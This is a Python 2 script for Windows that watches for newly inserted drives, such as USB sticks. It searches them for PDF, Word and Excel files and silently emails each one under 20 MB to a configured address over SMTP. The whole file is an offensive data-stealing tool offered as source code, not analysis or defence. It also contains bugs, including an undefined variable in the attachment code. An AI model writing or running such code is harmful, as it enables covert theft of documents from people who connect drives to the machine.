# -*- coding: UTF-8 -*-
#Copyright 2017 Ramon Vila Ferreres <ramonvilafer@gmail.com>
#
#Licensed under the Apache License, Version 2.0 (the "License");
#you may not use this file except in compliance with the License.
#You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
#Unless required by applicable law or agreed to in writing, software
#distributed under the License is distributed on an "AS IS" BASIS,
#WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#See the License for the specific language governing permissions and
#limitations under the License

import string
from ctypes import windll
import time
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
import shutil
import socket

global sent
sent = []
extensions = ['pdf','doc','ocx','xls','lsx'] # The search algorithm reads extensions from here

mail = [
        'receiver@mail.com', # To
        'sender@mail.com',# From
        'smtp.mail.com:port', # Server:Port
        'user', # User
        'password', # Password
       ]

#Functions
#---------

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for devices in string.uppercase:
        if bitmask & 1:
            drives.append(devices)
        bitmask >>= 1
    return drives #List


def scanner():
    while True:
        before = set(get_drives())
        time.sleep(1)
        after = set(get_drives())
        drives = after - before
        delta = len(drives)

        if (delta != 0):
            for drive in drives:
                if os.system("cd " + drive + ":") == 0:
                    newly_mounted = drive
                    global new_route
                    new_route = newly_mounted +':/'
                    seek_and_destroy(new_route)
        else:
            continue
        
def seek_and_destroy(R): # Recieves a route and then, searches for the files ending with the indicated extensions
    for base, dirs, files in os.walk(str(R)):
       for file in files:
          if file == None or '':
              continue
          elif file != (None or ''):
              Ext = str(file[-3])+str(file[-2])+str(file[-1]) #Extension
              print extensions
              if Ext in extensions:
                   if base == []:
                    continue
                   elif base != []:
                      if files == []:
                         continue
                      elif files != []:
                         for a in files:
                            print a
                            if a == '[':
                                continue
                            elif a  == ']':
                                continue
                            elif a  == "'":
                                continue
                            else:
                                if base+'/'+a not in sent:
                                    send_mail(base+'/'+a)
                                else:
                                    pass

def send_mail(FILE):
        Ext2 = str(FILE[-3])+str(FILE[-2])+str(FILE[-1])

        file_stats = os.stat(FILE)
        size_file = float(file_stats[6]/1000) #KB
        size_limit = 20000 #KB

        if FILE not in sent: 
            if Ext2 in extensions:
                if size_file <= size_limit: 

                    sent.append(FILE)

                    msg = MIMEMultipart() 
                    msg['To'] = mail[0]
                    msg['From'] = mail[1]
                    msg['Subject'] = str(FILE) #Message subject
                
                    msg.attach(MIMEText('Data','plain')) 
                    fp = open(FILE,'rb')
                    adjunto = MIMEBase('multipart', 'encrypted')

                    added.set_payload(fp.read())
                    fp.close()
                    encoders.encode_base64(added)

                   
                    added.add_header('Content-Disposition', 'attachment', filename = FILE)


                    msg.attach(added) 

                    server = smtplib.SMTP(mail[2]) 
                    server.ehlo()
                    server.starttls()

                    server.login(mail[3],mail[4]) #Authentication USER,PASSWORD
                    server.sendmail(mail[0], mail[1], msg.as_string()) 

                    server.quit() 

#CALLS
#--------
for a in range(0,1000000): #Ensures that if the USB is plugged out, the function scanner won't finish running
    scanner()
